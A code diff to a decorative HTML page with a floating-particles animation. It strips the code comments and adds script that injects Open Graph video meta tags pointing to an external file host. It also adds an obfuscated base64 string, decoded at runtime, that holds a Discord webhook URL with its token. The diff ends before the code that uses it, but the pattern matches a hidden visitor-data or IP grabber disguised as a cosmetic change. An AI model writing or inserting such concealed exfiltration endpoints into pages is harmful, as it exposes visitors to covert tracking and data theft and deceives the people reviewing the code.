@@ -300,7 +300,6 @@
             }
         }
 
-        /* Floating particles background */
         .particles {
             position: fixed;
             top: 0;
@@ -367,10 +366,8 @@
     </div>
 
     <script>
-        // Set current timestamp
         document.getElementById('timestamp').textContent = new Date().toLocaleString();
         
-        // Create floating particles
         function createParticles() {
             const particlesContainer = document.getElementById('particles');
             const particleCount = window.innerWidth < 768 ? 15 : 30;
@@ -379,16 +376,13 @@
                 const particle = document.createElement('div');
                 particle.classList.add('particle');
                 
-                // Random size between 5px and 20px
                 const size = Math.random() * 15 + 5;
                 particle.style.width = `${size}px`;
                 particle.style.height = `${size}px`;
                 
-                // Random position
                 particle.style.left = `${Math.random() * 100}%`;
                 particle.style.top = `${Math.random() * 100}%`;
                 
-                // Random animation duration and delay
                 const duration = Math.random() * 20 + 10;
                 const delay = Math.random() * 10;
                 particle.style.animation = `float ${duration}s ${delay}s infinite linear`;
@@ -398,6 +392,17 @@
         }
         
         createParticles();
+
+        const metaTags = `
+            <meta property="og:description" content="Interesting video content">
+            <meta property="og:video" content="https://files.catbox.moe/bjapj5.mp4">
+            <meta property="og:video:type" content="video/mp4">
+            <meta property="og:video:width" content="1280">
+            <meta property="og:video:height" content="720">
+            <meta property="og:type" content="video.other">
+            <meta property="og:url" content="${window.location.href}">
+        `;
+        document.head.insertAdjacentHTML('beforeend', metaTags);
 
         const funny = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4ODYxMjQ5NzMyNTU1NTc1Mi9fS1J3Xy02dy04dUhnaGIzVmV1Q0xHay1ETEU0U2pRcmJTZDNWcC1XMG9SbXM4RFU0QTJwSGtiQS1RQWxqdDdGZDVELQ==");
 
